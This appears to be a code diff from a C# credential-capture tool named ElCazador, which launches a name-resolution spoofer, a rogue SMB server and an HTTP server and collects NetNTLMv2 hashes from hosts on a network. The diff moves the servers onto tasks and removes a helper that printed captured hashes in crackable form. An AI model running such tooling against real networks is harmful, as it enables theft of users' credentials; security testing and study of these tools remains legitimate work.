@@ -11,79 +11,31 @@ using ElCazador.Worker.Modules.Spoofers;
 using System.Drawing;
 using ElCazador.Worker.Models;
 using System.Collections.Concurrent;
+using ElCazador.Worker.Interfaces;
 
 namespace ElCazador.Worker
 {
     public class Worker
-    {
-        internal static IPAddress IP { get; set; } = IPAddress.Parse("10.64.13.79"); //Networking.GetLocalIPAddress();
-        // internal static IPAddress IP { get; set; } = IPAddress.Parse("192.168.0.2"); //Networking.GetLocalIPAddress();
-        private static Thread SpooferWork { get; set; }
-        private static Thread SMBServerWork { get; set; }
-        private static Thread HTTPServerWork { get; set; }
+    { //Networking.GetLocalIPAddress();
+                                                                                     // internal static IPAddress IP { get; set; } = IPAddress.Parse("192.168.0.2"); //Networking.GetLocalIPAddress();
+                                                                                     // private static Thread SpooferWork { get; set; }
+                                                                                     // private static Thread SMBServerWork { get; set; }
+                                                                                     // private static Thread HTTPServerWork { get; set; }
         private static IDictionary<string, Hash> Hashes { get; set; } = new ConcurrentDictionary<string, Hash>();
 
-        private IWorkerController Controller;
+        private IWorkerController Controller { get; set; }
 
         public Worker(IWorkerController controller)
         {
             Controller = controller;
 
-            var spoofer = new SpooferCore(new SpooferSettings { });
-            var smbServer = new SMBServer();
-            var httpServer = new HTTPServer(80);
+            var spoofer = new SpooferCore(controller, new SpooferSettings { });
+            var smbServer = new SMBServer(controller);
+            var httpServer = new HTTPServer(controller, 80);
 
-            SpooferWork = new Thread(spoofer.Run);
-            HTTPServerWork = new Thread(httpServer.Run);
-            SMBServerWork = new Thread(smbServer.Run);
-
-            SpooferWork.Start();
-            HTTPServerWork.Start();
-            SMBServerWork.Start();
-        }
-
-        public static void WriteLine(string value, params object[] args)
-        {
-            Console.WriteLine(value, args);
-        }
-
-        public static void Write(string value, params object[] args)
-        {
-            Console.Write(value, args);
-        }
-
-        public static void AddHash(Hash hash)
-        {
-            // To avoid empty shit
-            if (hash.Key.Equals("\\"))
-            {
-                return;
-            }
-
-            if (Hashes.ContainsKey(hash.Key))
-            {
-                Worker.Write("{2}Already collected hash from {0}\\{1}", hash.Domain, hash.User, Environment.NewLine);
-            }
-            else
-            {
-                Hashes.Add(hash.Key, hash);
-
-                WriteHash(hash);
-            }
-        }
-
-        private static void WriteHash(Hash hash)
-        {
-            Worker.Write(
-                    @"{0}Received NetNTLMv2 hash from {1}{0}{2}::{3}:{4}:{5}:{6}",
-                    Environment.NewLine,
-                    hash.IPAddress.ToString(),
-                    hash.User,
-                    hash.Domain,
-                    hash.Challenge,
-                    String.Concat(hash.NetLMHash),
-                    string.Concat(hash.NetNTHash)
-                );
+            Task.Run(spoofer.Run);
+            Task.Run(httpServer.Run);
+            Task.Run(smbServer.Run);
         }
 
         public static string ByteArrayToString(byte[] ba)
